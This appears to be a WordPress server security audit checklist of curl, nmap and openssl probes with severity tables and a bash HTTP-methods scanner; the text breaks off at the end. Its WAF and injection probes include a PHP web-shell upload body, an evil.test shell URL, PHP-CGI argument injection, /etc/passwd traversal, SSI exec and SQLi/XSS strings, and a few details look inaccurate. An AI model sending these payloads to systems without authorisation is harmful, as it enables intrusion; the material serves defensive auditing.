# 13, Server Security Configuration Audit Checklist

> **Scope:** Remote (unauthenticated), WordPress server hardening audit
> **Method:** Curl, nmap, openssl s_client, timing probes
> **Severity scale:** Critical / High / Medium / Low / Info

---

## Table of Contents

1. [Web Server Detection](#1-web-server-detection)
2. [Directory Listing Test](#2-directory-listing-test)
3. [HTTP Methods Allowed](#3-http-methods-allowed)
4. [PHP Detection via Headers & Extensions](#4-php-detection-via-headers--extensions)
5. [Server Header Version Disclosure](#5-server-header-version-disclosure)
6. [PHP disable_functions Inference](#6-php-disable_functions-inference)
7. [open_basedir Detection](#7-open_basedir-detection)
8. [ModSecurity Detection](#8-modsecurity-detection)
9. [Server Timing Inference](#9-server-timing-inference)
10. [HTTP/2 vs HTTP/1.1 Detection](#10-http2-vs-http11-detection)
11. [Gzip / Brotli Compression Info Leakage](#11-gzip--brotli-compression-info-leakage)
12. [Server-Side Includes (SSI) Test](#12-server-side-includes-ssi-test)
13. [TRACE Method (XST Attack)](#13-trace-method-xst-attack)
14. [WebDAV Detection](#14-webdav-detection)

---

## 1. Web Server Detection

### 1.1, Server Header Inspection

```bash
curl -sI "https://target.tld/" | grep -i "^server:"
```

**Interpretation:**
| Header Value | Server |
|---|---|
| `Apache` | Apache HTTPD |
| `nginx` | Nginx |
| `LiteSpeed` | LiteSpeed Web Server |
| `LiteSpeed` + `X-LiteSpeed-Cache` | LiteSpeed + LSCache |
| `openlitespeed` | OpenLiteSpeed |
| `Microsoft-IIS/10.0` | IIS 10 |
| `Microsoft-IIS/8.5` | IIS 8.5 |

```bash
# Fallback when Server header is stripped, probe response ordering
curl -sI "https://target.tld/" | head -20
# Apache often sends Date first; Nginx sends Server first (when present)
```

### 1.2, X-Powered-By Header

```bash
curl -sI "https://target.tld/" | grep -i "x-powered-by"
```

**Interpretation:** `ASP.NET` suggests IIS; `PHP/8.x` suggests Apache/Nginx/LiteSpeed with PHP-FPM or mod_php.

### 1.3, Nmap Service Fingerprinting

```bash
nmap -sV -p 443 --script=http-server-header target.tld
```

### 1.4, Cookies & Directories Clues

```bash
# Check for IIS-specific cookies
curl -sI "https://target.tld/" | grep -i "set-cookie" | grep -i "ASPSESSION"

# IIS-specific request, 404 message differs
curl -s "https://target.tld/nonexistent_iis_test.html" | grep -i "iis\|ASP.NET"
```

**Severity:** Info, Server fingerprinting is reconnaissance, not an exploit, but knowing the server type enables targeted attacks.

---

## 2. Directory Listing Test

### 2.1, WordPress-Specific Directories

```bash
WP_DIRS=(
  "wp-content/uploads"
  "wp-content/plugins"
  "wp-content/themes"
  "."
  "wp-includes"
  "wp-admin"
  "wp-content"
)

for dir in "${WP_DIRS[@]}"; do
  echo "=== /$dir ==="
  curl -s -o /dev/null -w "HTTP %{http_code}  Size: %{size_download} bytes  Encoding: %{content_type}" \
    "https://target.tld/$dir/"
  echo
done
```

### 2.2, Directory Listing Indicator

```bash
curl -s "https://target.tld/wp-content/uploads/" | head -30
```

**Interpretation:**
| Response | Meaning |
|---|---|
| 200 + HTML listing with `<li>` or `<a>` links | **VULNERABLE**, directory listing enabled |
| 200 + blank page or just "Index of /" without links | Possibly listing but empty |
| 403 Forbidden | Directory access blocked (secure) |
| 404 Not Found | Directory hidden or non-existent |
| 301 redirect to login | WordPress redirects, but listing might still exist |
| 200 + loads WordPress front-end | Directory listing disabled (falls through to index.php) |

### 2.3, Auto-Index Detection

```bash
# Apache-specific
curl -s "https://target.tld/wp-content/uploads/" | grep -i "Index of\|autoindex\|<title>.*/"
```

**Severity:**
| Finding | Severity |
|---|---|
| Directory listing on `uploads/` | **High**, exposes uploaded files (PII, backups, media) |
| Directory listing on `plugins/` or `wp-includes/` | **High**, reveals version info, enables vulnerability mapping |
| Directory listing on `/` | **Medium**, reveals site structure |
| All directories 403/404 | **Info**, configured correctly |

---

## 3. HTTP Methods Allowed

### 3.1, OPTIONS Request (Baseline)

```bash
curl -sI -X OPTIONS "https://target.tld/" | grep -i "allow\|public"
```

**Interpretation:** Lists all methods the server advertises as allowed.

### 3.2, Test Dangerous Methods (Individual Probes)

```bash
# Test dangerous methods one by one
for method in PUT DELETE TRACE CONNECT PATCH MOVE COPY PROPFIND MKCOL; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "https://target.tld/")
  echo "$method  ->  HTTP $code"
done

# Test PUT with body (more reliable than empty request)
curl -s -o /dev/null -w "PUT with body -> HTTP %{http_code}\n" \
  -X PUT -d "test" "https://target.tld/test_htaccess_check.txt"

# Test DELETE on a known resource
curl -s -o /dev/null -w "DELETE -> HTTP %{http_code}\n" -X DELETE "https://target.tld/readme.html"
```

### 3.3, Verb Tampering / Bypass

```bash
# HEAD is often left open even when GET is blocked
curl -sI "https://target.tld/wp-admin/" | head -10
```

**Interpretation Matrix:**
| Method | 200/2xx | 301/302 | 403 | 405 (Not Allowed) | 501 |
|---|---|---|---|---|---|
| **PUT** | **HIGH**, file upload possible | Usually safe | Usually safe | Expected blocked | Blocked / unknown method |
| **DELETE** | **HIGH**, file deletion possible | Usually safe | Usually safe | Expected blocked | Blocked |
| **TRACE** | **MEDIUM**, XST possible | n/a | n/a | Expected blocked | Blocked |
| **CONNECT** | **HIGH**, possible proxy | n/a | n/a | Expected blocked | Blocked |
| **PATCH** | **MEDIUM**, partial modify | n/a | n/a | Expected blocked | Blocked |
| **MOVE/COPY** | **HIGH**, WebDAV | n/a | n/a | Expected blocked | n/a |
| **MKCOL** | **HIGH**, directory creation | n/a | n/a | Expected blocked | n/a |

**Severity:**
| Finding | Severity |
|---|---|
| PUT allowed (2xx/3xx) | **Critical** |
| DELETE allowed | **Critical** |
| TRACE allowed | **Medium** (XST attack vector) |
| CONNECT allowed | **Critical** (proxy abuse) |
| OPTIONS + dangerous methods advertised | **Medium** |
| Only GET/HEAD/POST/OPTIONS | **Info** (standard secure config) |

### 3.4, Nmap HTTP Methods Scan

```bash
nmap --script http-methods --script-args http-methods.url-path=/target.tld -p 443 target.tld
nmap --script http-methods --script-args http-methods.retest=true -p 443 target.tld
```

---

## 4. PHP Detection via Headers & Extensions

### 4.1, X-Powered-By Header

```bash
curl -sI "https://target.tld/" | grep -i "x-powered-by"
curl -sI "https://target.tld/wp-content/plugins/" | grep -i "x-powered-by"
```

**Interpretation:**
- `X-Powered-By: PHP/8.1.26`, PHP version exposed → **Medium** severity
- Header absent, PHP may still be running (properly hardened)
- Some hosts mask this via `expose_php = Off` in php.ini

### 4.2, PHP Extension Probing

```bash
# Direct PHP extension probing
for ext in php php3 php4 php5 php7 php8 phtml pht php.sthpl shtml inc; do
  code=$(curl -s -o /dev/null -w "%{http_code}\n" "https://target.tld/testfile.$ext")
  echo "$ext -> $code"
done
```

**Interpretation:**
- `.php` → 200 (if test file exists) or 404 (safe, no test file)
- `.phtml` or `.php5` → 200/403 means alternate PHP handlers are active → **Medium**
- `.shtml` → 200/403 means SSI may be active (see [section 12](#12-server-side-includes-ssi-test))

### 4.3, PHP Info Leak via Favicon Path

```bash
# Some misconfigured servers expose phpinfo() at predictable paths
for path in phpinfo.php info.php test.php p.php i.php; do
  code=$(curl -s -o /dev/null -w "%{http_code}\n" "https://target.tld/$path")
  echo "$path -> $code"
done
```

### 4.4, Server Header PHP Backend Detection

```bash
# Check for PHP-FPM specific markers in response
curl -sI "https://target.tld/" | grep -i "x-powered-by\|server\|x-proxy-cache\|x-fastcgi-cache"
```

**Severity:**
| Finding | Severity |
|---|---|
| PHP version in X-Powered-By | **Medium**, enables version-specific vulnerability search |
| PHP extension handler (phtml/php5) active | **Medium**, additional attack surface |
| phpinfo() exposed | **Critical**, full server configuration leak |
| No PHP headers + no PHP files = no PHP | **Info**, static site |
| expose_php = Off (headers hidden) | **Info**, good practice |

---

## 5. Server Header Version Disclosure

### 5.1, Full Server Header Capture

```bash
curl -sI "https://target.tld/" | grep -i "^server:"
```

### 5.2, Version in Error Pages

```bash
# Trigger various errors and capture verbose banners
curl -s "https://target.tld/nonexistent-404-test" | grep -i "apache\|nginx\|iis\|litespeed\|version" | head -10

# Force a 501 or 405 and inspect
curl -sI -X FOO "https://target.tld/" | head -20
```

### 5.3, Nmap Version Scan

```bash
nmap -sV --version-intensity 9 -p 443 target.tld
```

### 5.4, HTTP Response Header Dump

```bash
curl -sI "https://target.tld/" | tr '\r\n' '\n'
```

**Severity:**
| Finding | Severity |
|---|---|
| `Server: Apache/2.4.6 (Ubuntu)`, full version + OS | **Medium** |
| `Server: Apache/2.4.6`, version only | **Medium** |
| `Server: nginx`, no version | **Low** |
| `Server: Apache`, no version | **Low** |
| `Server: cloudflare`, CDN masking true server | **Info** |
| No Server header at all | **Info**, best practice |
| `ServerTokens Prod` on Apache (just "Apache") | **Info**, moderate hardening |
| `ServerTokens Minor` or `OS`, verbose version | **Medium** |
| `server_tokens off;` on Nginx | **Info**, best practice |

---

## 6. PHP disable_functions Inference

> These tests attempt to infer which dangerous PHP functions are disabled, remotely and without authentication.

### 6.1, CGI-Based exec() Test

```bash
# Probe for PHP-CGI query string execution (CVE-2012-1823 style)
curl -s "https://target.tld/index.php?-s" | head -20
# If source code returned, PHP-CGI is exposed, HIGH severity

# Test -d flag for ini modification
curl -s "https://target.tld/index.php?-d+allow_url_include=1"
```

**Interpretation:**
- PHP source code returned → CGI mode with `-s` flag → **Critical**
- `allow_url_include` modification via query string → **Critical**
- 200 with normal page → not exploitable via CGI args
- 404/500 → CGI args may be blocked (good)

### 6.2, Image Processing (shell_exec/exec via GD)

```bash
# Test if image processing endpoints exist (WordPress wp_crop_image)
curl -s "https://target.tld/wp-admin/admin-ajax.php?action=crop_image" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "src=http://evil.test/shell.php&dw=100&dh=100" \
  -o /dev/null -w "%{http_code}"
```

**Interpretation:**
- 200 with JSON error about missing parameters → `exec()` / `shell_exec()` may be available
- 500 → possible crash on disabled function
- Direct interpretation is limited without a live test file

### 6.3, phpMyAdmin / Debug Endpoint Leakage

```bash
# Some debug panels reveal disable_functions
for path in debug phpinfo wp-config.phps phpinfo.php server-status; do
  echo "=== $path ==="
  curl -s "https://target.tld/$path" | grep -i "disable_functions" | head -5
done
```

### 6.4, NSE Script for PHP Info

```bash
nmap --script http-php-version -p 443 target.tld
```

### 6.5, WordPress REST API User Enumeration (PHP back-end insight)

```bash
# PHP backend processing can sometimes be inferred from error responses
curl -s "https://target.tld/wp-json/wp/v2/users/" | head -20
```

**Severity:**
| Finding | Severity |
|---|---|
| phpinfo() or disable_functions visible | **Critical** |
| PHP-CGI query string accepted (`-s`, `-d`) | **Critical** |
| WP debug panel with PHP config info | **High** |
| Generic PHP processing detected | **Info** |

> Note: True `disable_functions` inference requires authenticated code execution or a PHP info leak. Remote probes are suggestive, not definitive.

---

## 7. open_basedir Detection

### 7.1, PHP Info Leak (direct)

```bash
# Check for exposed PHP info
curl -s "https://target.tld/phpinfo.php" | grep -i "open_basedir"
```

### 7.2, WordPress Error Log Leak

```bash
# WordPress debug.log often reveals path restrictions
curl -s "https://target.tld/wp-content/debug.log" | grep -i "open_basedir\|restrict" | head -5
```

### 7.3, Chained Path Traversal / Include Test

```bash
# Attempt to read /etc/passwd via vulnerable endpoint (low chance w/o auth)
curl -s "https://target.tld/wp-content/themes/twentytwentyfour/404.php?page=../../../etc/passwd" \
  -o /dev/null -w "%{http_code}"
```

**Interpretation:**
- open_basedir information in phpinfo() → **High**
- debug.log with open_basedir info → **High**
- Traversal returning 500 vs 200 for in-path files may hint at open_basedir boundaries
- Without a PHP info leak: **Unknown**, marked as "inconclusive from remote"

**Severity:** High if leaked; **Info/Unknown** if not (requires authenticated access to test conclusively)

---

## 8. ModSecurity Detection

### 8.1, Specific 406 / 501 Response Codes

```bash
# Trigger ModSecurity intentionally
curl -s -o /dev/null -w "Standard request: %{http_code}\n" "https://target.tld/"

# Attempt SQL injection to trigger WAF
curl -s -o /dev/null -w "SQLi probe -> HTTP %{http_code}\n" \
  "https://target.tld/?p=1%27%20OR%20%271%27%3D%271"

# Attempt XSS to trigger WAF
curl -s -o /dev/null -w "XSS probe -> HTTP %{http_code}\n" \
  "https://target.tld/?s=<script>alert(1)</script>"

# File upload content type bypass
curl -s -o /dev/null -w "Suspicious content-type -> HTTP %{http_code}\n" \
  -X POST -H "Content-Type: multipart/form-data; boundary=-WebKitFormBoundary" \
  -d "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php system(\$_GET['cmd']);\r\n------WebKitFormBoundary--" \
  "https://target.tld/"
```

### 8.2, ModSecurity Response Header Detection

```bash
curl -sI "https://target.tld/" | grep -i "mod_security\|sec-"
```

**Look for headers:**
- `X-Mod-Security` or `X-ModSec`
- `Sec-WebSocket-Accept`
- Custom `X-Security` headers indicating WAF presence

### 8.3, Body Fingerprinting

```bash
# Blocked requests often have ModSecurity-specific HTML
curl -s "https://target.tld/?p=1%27%20OR%20%271%27%3D%271" | head -30

# Check for known ModSecurity block page patterns
curl -s "https://target.tld/?p=1' OR '1'='1" | grep -i \
  "not acceptable\|406\|mod_security\|access denied\|blocked by\|please accept\|error code 406\|request blocked\|waf\|security rule"
```

### 8.4, Nmap WAF Detection

```bash
nmap --script http-waf-detect -p 443 target.tld
nmap --script http-waf-fingerprint -p 443 target.tld
```

### 8.5, OWASP CSR / WAFSwag

```bash
# Use wafw00f if available
wafw00f https://target.tld
```

**Severity:**
| Finding | Severity |
|---|---|
| ModSecurity detected (headers / block pages) | **Info** (presence is good, WAF active) |
| ModSecurity NOT detected | **Low** (no WAF layer detected) |
| 406 on SQLi probe | **Info** (ModSecurity blocking OWASP rules) |
| 200 on malicious payload | **High** (WAF not protecting against common attacks) |
| Block page reveals ModSecurity rules/version | **Medium** (gives attacker version info) |

---

## 9. Server Timing Inference

### 9.1, Basic Timing Fingerprint

```bash
# Measure response times to fingerprint server type
for _ in {1..5}; do
  curl -s -o /dev/null -w "%{time_total}\n" "https://target.tld/"
done
```

### 9.2, Static vs Dynamic Response Timing

```bash
# Static file timing (usually faster, reveals OS/stack)
static_time=$(curl -s -o /dev/null -w "%{time_total}" "https://target.tld/wp-includes/css/dist/block-library/style.min.css")

# Dynamic page timing
dynamic_time=$(curl -s -o /dev/null -w "%{time_total}" "https://target.tld/")

echo "Static: ${static_time}s  Dynamic: ${dynamic_time}s"

# Ratio > 5x → PHP processing overhead visible → likely Nginx+PHP-FPM or Apache+mod_php
```

### 9.3, Connection Overhead, Apache vs Nginx

```bash
# Nginx usually responds faster in time_connect phase
# Apache sometimes has slightly higher connection setup overhead
curl -s -o /dev/null -w "time_connect: %{time_connect}s  time_starttransfer: %{time_starttransfer}s  time_total: %{time_total}s\n" \
  "https://target.tld/"
```

### 9.4, Version Fingerprinting via Response Order

```bash
# Apache 2.2 vs 2.4 vs Nginx ordering differs in response header sequence
curl -sI "https://target.tld/" | head -10
```

**Typical header order:**
- **Apache 2.4**: `Date`, `Server`, `Last-Modified`, `ETag`, `Accept-Ranges`, `Content-Length`, `Keep-Alive`, `Connection`, `Content-Type`
- **Nginx**: `Server`, `Date`, `Content-Type`, `Content-Length`, `Last-Modified`, `Connection`, `ETag`, `Accept-Ranges`
- **LiteSpeed**: `Server`, `Date`, `Content-Type`, `Content-Length`, `Last-Modified`, `X-LiteSpeed-Cache`, `Connection`

### 9.5, Timing-Based Edge Detection (CDN)

```bash
# Compare timing of direct IP vs hostname to detect CDN
host_ip=$(dig +short target.tld | head -1)
curl -s -o /dev/null -w "Direct IP: %{time_total}s\n" --resolve "target.tld:443:$host_ip" "https://target.tld/"
curl -s -o /dev/null -w "DNS name: %{time_total}s\n" "https://target.tld/"
```

**Severity:** Info, Timing inference is noisy and network-dependent. Useful for fingerprinting but not a direct vulnerability.

---

## 10. HTTP/2 vs HTTP/1.1 Detection

### 10.1, ALPN / HTTP/2 Negotiation Test

```bash
# Test HTTP/2 via curl
curl -sI --http2 "https://target.tld/" | head -5

# Compare HTTP/1.1 response
curl -sI --http1.1 "https://target.tld/" | head -5
```

### 10.2, Openssl ALPN Probe

```bash
# Manually test ALPN to see protocols offered
echo | openssl s_client -alpn h2,http/1.1 -connect target.tld:443 2>/dev/null | grep -i "alpn\|protocol"
```

### 10.3, Explicit HTTP/2 Upgrade Test

```bash
# Upgrade headers
curl -sI -H "Upgrade: h2c" -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
  "http://target.tld/" | grep -i "upgrade\|http2"
```

### 10.4, Nmap ALPN Detection

```bash
nmap --script ssl-enum-ciphers -p 443 target.tld
```

**Interpretation:**
| Finding | Interpretation |
|---|---|
| HTTP/2 supported | Modern, more efficient, not a security concern alone |
| HTTP/2 only | HTTP/1.1 downgrade not possible, slightly reduced attack surface |
| HTTP/1.1 + HTTP/2 | Standard modern config |
| No HTTP/2, only HTTP/1.1 | Older server, should upgrade (minor concern) |
| `h2c` (cleartext HTTP/2) accepted | Possible protocol smuggling if improperly configured → **Medium** |

**Severity:**
| Finding | Severity |
|---|---|
| HTTP/2 only + no HTTP/1.1 fallback | **Info** |
| HTTP/1.1 + HTTP/2 | **Info** |
| `h2c` upgrade accepted on plain HTTP | **Medium** (possible request smuggling) |
| NO HTTP/2 support at all | **Low** (older, but not vulnerable by itself) |

---

## 11. Gzip / Brotli Compression Info Leakage

### 11.1, Compression Detection

```bash
# Test gzip
curl -sI -H "Accept-Encoding: gzip, deflate" "https://target.tld/" | grep -i "content-encoding"

# Test brotli
curl -sI -H "Accept-Encoding: br" "https://target.tld/" | grep -i "content-encoding"

# Full test
for encoding in "gzip" "deflate" "br" "gzip, deflate, br"; do
  encoding_header=$(curl -s -o /dev/null -w "%{content_type} | %{size_download}" \
    -H "Accept-Encoding: $encoding" "https://target.tld/")
  echo "Accept-Encoding: $encoding -> $encoding_header"
done
```

### 11.2, CRIME/BREACH Side-Channel Test

```bash
# BREACH attack surface: compressed responses containing CSRF tokens
curl -s -H "Accept-Encoding: gzip" "https://target.tld/" | wc -c

# Compare compressed vs uncompressed sizes
uncompressed=$(curl -s -H "Accept-Encoding: identity" "https://target.tld/" | wc -c)
compressed=$(curl -s -H "Accept-Encoding: gzip" "https://target.tld/" | wc -c)
echo "Uncompressed: $uncompressed bytes | Compressed: $compressed bytes | Ratio: $(echo "scale=2; $compressed / $uncompressed" | bc)"
```

### 11.3, TLS-Level Compression Detection

```bash
# TLS compression is a separate concern (CRIME attack)
echo | openssl s_client -connect target.tld:443 2>/dev/null | grep -i "compression"
```

**Interpretation:**
| Finding | Severity |
|---|---|
| gzip and/or brotli enabled | **Info**, standard, expected |
| Content-Encoding varies between pages (secret in/out of compression) | **Low**, possible BREACH attack surface |
| TLS compression enabled (`COMPRESSION DEFLATE`) | **High**, CRIME attack |
| Large compression ratio on dynamic pages with CSRF tokens | **Low**, theoretical BREACH concern |
| No compression at all | **Low**, potentially slower, but not vulnerable |

---

## 12. Server-Side Includes (SSI) Test

### 12.1, SSI via .shtml / .stm

```bash
# Test for SSI handler on known extensions
for ext in shtml stm shtm; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.tld/test.$ext")
  echo ".$ext -> HTTP $code"
done
```

### 12.2, SSI Injection via Query String

```bash
# Test if SSI directives in URL are processed
curl -s "https://target.tld/?page=<!--%23exec%20cmd=\"ls\"-->"

# URL-encoded SSI test
curl -s "https://target.tld/?page=%3C!--%23echo%20var=%22DOCUMENT_NAME%22%20--%3E"
```

### 12.3, SSI via WordPress Template Injection

```bash
# Test SSI reflection in 404 templates
curl -s "https://target.tld/<!--%23echo%20var=\"DATE_LOCAL\"-->"
```

**Interpretation:**
| Response Code | Meaning |
|---|---|
| 200 + SSI directive reflected but not executed | Not vulnerable |
| 200 + SSI output visible (date, env vars) | **CRITICAL**, SSI injection confirmed |
| 404 on `.shtml` | SSI handler not active for that extension |
| 200 + blank page for `.shtml` | Handler active, file doesn't exist but extension is recognized |
| 403 for `.shtml` | SSI may be blocked by access control (good) |

**Severity:**
| Finding | Severity |
|---|---|
| SSI directives executed | **Critical** (RCE-like, can execute system commands) |
| SSI handler active (`.shtml` returns 200/403 pattern) | **Medium** |
| `.shtml` returns 404 | **Info**, SSI likely disabled |
| `<!--#exec cmd=` tested and confirmed | **Critical**, immediate remediation needed |

---

## 13. TRACE Method (XST Attack)

### 13.1, TRACE Method Test

```bash
# TRACE test, if enabled, returns the request body verbatim
curl -s -X TRACE "https://target.tld/" -H "X-Test: XST-Proof"
```

**Interpretation:**
- Response contains `X-Test: XST-Proof` in the body → **TRACE IS ENABLED** → **Medium/High**
- Empty response or 405 → TRACE disabled (secure)

### 13.2, Verbose TRACE with Body

```bash
curl -s -X TRACE -d "TRACE_REQUEST_BODY_TEST" "https://target.tld/"
```

**Interpretation:** If response echoes the body back, TRACE is active.

### 13.3, TRACE on All Endpoints

```bash
for endpoint in "/" "/wp-admin/" "/wp-login.php" "/xmlrpc.php" "/wp-cron.php"; do
  echo "=== $endpoint ==="
  curl -s -X TRACE "https://target.tld$endpoint" -i | head -10
  echo
done
```

**Severity:**
| Finding | Severity |
|---|---|
| TRACE enabled + `HttpOnly` cookies absent | **Medium** (XST, can steal cookies via `XmlHttpRequest`) |
| TRACE enabled + `HttpOnly` cookies present | **Low** (HttpOnly blocks cookie theft, but XST still possible for headers) |
| TRACE disabled (405/403) | **Info**, secure |
| TRACE returns 200 but body empty | **Info**, safe (server accepts but doesn't echo) |

---

## 14. WebDAV Detection

### 14.1, PROPFIND Method Test

```bash
# PROPFIND is the primary WebDAV discovery method
curl -s -X PROPFIND "https://target.tld/" -H "Depth: 0" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><propfind xmlns="DAV:"><prop><displayname/></prop></propfind>'
```

### 14.2, OPTIONS + WebDAV Classes

```bash
# OPTIONS with WebDAV-specific class detection
curl -sI -X OPTIONS "https://target.tld/" | grep -i "dav\|webdav\|class"
```

**Look for:**
- `Dav: 1`, `Dav: 2`, `Dav: 3`, WebDAV class
- `Microsoft-WebDAV-MiniRedir`, Windows WebDAV client headers

### 14.3, WebDAV File Discovery

```bash
# Check for common WebDAV files and paths
for path in dav webdav DAV WEBDAV _vti_bin MSOffice/clreq; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.tld/$path")
  echo "/$path -> HTTP $code"
done
```

### 14.4, Nmap WebDAV Scan

```bash
nmap --script http-webdav-scan -p 443 target.tld
```

### 14.5, IIS WebDAV Specific

```bash
# IIS often enables WebDAV by default (notable on older IIS versions)
curl -sI -X OPTIONS "https://target.tld/" | grep -i "microsoft\|webdav\|public\|dav"
```

**Interpretation:**
| Response | Meaning |
|---|---|
| `DAV: 1, 2, 3` in OPTIONS response | WebDAV enabled |
| PROPFIND returns XML with `displayname` | WebDAV active → **High** |
| OPTIONS returns `Microsoft-WebDAV-MiniRedir` | IIS WebDAV → **High** |
| 405/501 on PROPFIND | WebDAV disabled (secure) |
| 207 Multi-Status on PROPFIND | **Critical**, WebDAV with read/write access |

**Severity:**
| Finding | Severity |
|---|---|
| WebDAV active (PROPFIND returns XML) | **High** |
| WebDAV active with PUT/DELETE/MKCOL | **Critical** |
| WebDAV on IIS + older Windows Server | **Critical** (known CVEs) |
| WebDAV disabled | **Info** |

---

## 15. HTTP Methods Test Script

> Save the following as `http-methods-test.sh` and run against any target.

```bash
#!/usr/bin/env bash
# =============================================================================
# HTTP Methods Security Test
# Tests allowed/disallowed HTTP methods on a target web server.
# Usage: ./http-methods-test.sh https://target.tld/
# =============================================================================

set -euo pipefail

TARGET="${1:?Usage: $0 <target_url>}"
BANNER_COLOR='\033[0;34m'
PASS_COLOR='\033[0;32m'
WARN_COLOR='\033[0;33m'
FAIL_COLOR='\033[0;31m'
INFO_COLOR='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${BANNER_COLOR}"
echo "╔════════════════════════════════════════════════════╗"
echo "║        HTTP Methods Security Scanner              ║"
echo "║        Target: $TARGET"
echo "╚════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ── Phase 1: OPTIONS Discovery ──────────────────────────────────────────
echo -e "${INFO_COLOR}[*] Phase 1: OPTIONS Discovery${NC}"
options_result=$(curl -sI -X OPTIONS "$TARGET/" | grep -i "allow:" | sed 's/Allow: //I' | sed 's/allow: //I')
if [ -z "$options_result" ]; then
  echo -e "${WARN_COLOR}  [!] No Allow header in OPTIONS response. Server may suppress it.${NC}"
  echo -e "${WARN_COLOR}  [!] Proceeding with per-method tests anyway.${NC}"
  options_result="(Unknown, testing individually below)"
fi
echo "  Allow: $options_result"
echo ""

# ── Phase 2: Per-Method Test ────────────────────────────────────────────
echo -e "${INFO_COLOR}[*] Phase 2: Per-Method HTTP Code Test${NC}"

DANGEROUS_METHODS=(
  "PUT"
  "DELETE"
  "TRACE"
  "CONNECT"
  "PATCH"
  "MOVE"
  "COPY"
  "MKCOL"
  "PROPFIND"
  "LOCK"
  "UNLOCK"
  "PROPPATCH"
)

declare -A SEVERITY_MAP
SEVERITY_MAP[PUT]="CRITICAL"
SEVERITY_MAP[DELETE]="CRITICAL"
SEVERITY_MAP[TRACE]="MEDIUM"
SEVERITY_MAP[CONNECT]="CRITICAL"
SEVERITY_MAP[PATCH]="MEDIUM"
SEVERITY_MAP[MOVE]="CRITICAL"
SEVERITY_MAP[COPY]="HIGH"
SEVERITY_MAP[MKCOL]="HIGH"
SEVERITY_MAP[PROPFIND]="HIGH"
SEVERITY_MAP[LOCK]="MEDIUM"
SEVERITY_MAP[UNLOCK]="MEDIUM"
SEVERITY_MAP[PROPPATCH]="HIGH"

for method in "${DANGEROUS_METHODS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$TARGET/" 2>/dev/null || echo "TIMEOUT/ERR")
  severity="${SEVERITY_MAP[$method]}"

  case "$code" in
    200|201|202|204|207)
      echo -e "  ${FAIL_COLOR}[$severity]${NC} $method → HTTP $code [ALLOWED, dangerous]"
      ;;
    301|302|303|307|308)
      echo -e "  ${FAIL_COLOR}[$severity]${NC} $method → HTTP $code [REDIRECT, method may propagate]"
      ;;
    403)
      echo -e "  ${PASS_COLOR}[SAFE]${NC}    $method → HTTP $code [Forbidden, blocked]"
      ;;
    405)
      echo -e "  ${PASS_COLOR}[SAFE]${NC}    $method → HTTP $code [Method Not Allowed]"
      ;;
    501)
      echo -e "  ${PASS_COLOR}[SAFE]${NC}    $method → HTTP $code [Not Implemented]"
      ;;
    400)
      echo -e "  ${WARN_COLOR}[UNKNOWN]${NC} $method → HTTP $code [Bad Request, possible WAF]"
      ;;
    406)
      echo -e "  ${WARN_COLOR}[UNKNOWN]${NC} $method → HTTP $code [Not Acceptable, possible ModSecurity]"
      ;;
    TIMEOUT/ERR)
      echo -e "  ${WARN_COLOR}[UNKNOWN]${NC} $method → Connection error"
      ;;
    *)
      echo -e "  ${WARN_COLOR}[UNKNOWN]${NC} $method → HTTP $code (unexpected)"
      ;;
  esac
done

echo ""

# ── Phase 3: PUT Test with Body ─────────────────────────────────────────
echo -e "${INFO_COLOR}[*] Phase 3: PUT Write Test (with payload)${NC}"
put_code=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
  -d "<?php echo 'SECURITY_AUDIT_TEST';" \
  -H "Content-Type: application/x-php" \
  "$TARGET/security_audit_put_test_$(date +%s).php" 2>/dev/null)
if [ "$put_code" = "200" ] || [ "$put_code" = "201" ] || [ "$put_code" = "204" ]; then
  echo -e "  ${FAIL_COLOR}[CRITICAL]${NC} PUT with body → HTTP $put_code [FILE UPLOAD POSSIBLE]"
else
  echo -e "  ${PASS_COLOR}[SAFE]${NC}    PUT with body → HTTP $put_code [File upload not allowed]"
fi

echo ""

# ── Phase 4: HEAD Bypass Test ───────────────────────────────────────────
echo -e "${INFO_COLOR}[*] Phase 4: HEAD Method, Warning if different from GET${NC}"
head_code=$(curl -s -o /dev/null -w "%{http_code}" -X HEAD "$TARGET/" 2>/dev/null)
get_code=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$TARGET/" 2>/dev/null)
if [ "$head_code" != "$get_code" ]; then
  echo -e "  ${WARN_COLOR}[WARNING]${NC} HEAD → HTTP $head_code vs GET → HTTP $get_code [Different behavior, possible information leak]"
else
  echo -e "  ${PASS_COLOR}[INFO]${NC}    HEAD ($head_code) matches GET ($get_code) [Consistent]"
fi

echo ""

# ── Phase 5: Summary ────────────────────────────────────────────────────
echo -e "${BANNER_COLOR}"
echo "╔════════════════════════════════════════════════════╗"
echo "║  Summary                                           ║"
echo "╚════════════════════════════════════════════════════╝"
echo -e "${NC}"

critical_count=0
high_count=0
medium_count=0
echo "  Target: $TARGET"
echo "  Advertised methods via OPTIONS: $options_result"
echo ""
echo "  Severity Legend:"
echo -e "  ${FAIL_COLOR}■ CRITICAL${NC}, Immediate remediation required (RCE / file upload)"
echo -e "  ${FAIL_COLOR}■ HIGH${NC}, Significant risk (WebDAV, arbitrary operations)"
echo -e "  ${WARN_COLOR}■ MEDIUM${NC}, Moderate risk (XST, partial operations)"
echo -e "  ${PASS_COLOR}■ SAFE${NC}, Correctly blocked"
echo -e "  ${WARN_COLOR}■ UNKNOWN${NC}, Requires manual investigation"
echo ""

echo -e "  ${INFO_COLOR}Reminder:${NC} Always verify findings with authenticated tests"
echo -e "  ${INFO_COLOR}         ${NC} and manual review where possible."
echo ""
```

---

## Quick Reference, One-Liners

```bash
# Server header
curl -sI https://target.tld/ | grep -i "^server:"

# Directory listing
curl -s https://target.tld/wp-content/uploads/ | head -10

# OPTIONS methods
curl -sI -X OPTIONS https://target.tld/ | grep -i "allow:"

# TRACE (XST)
curl -s -X TRACE -H "X-Test: XST" https://target.tld/

# PHP version
curl -sI https://target.tld/ | grep -i "x-powered-by"

# ModSecurity test
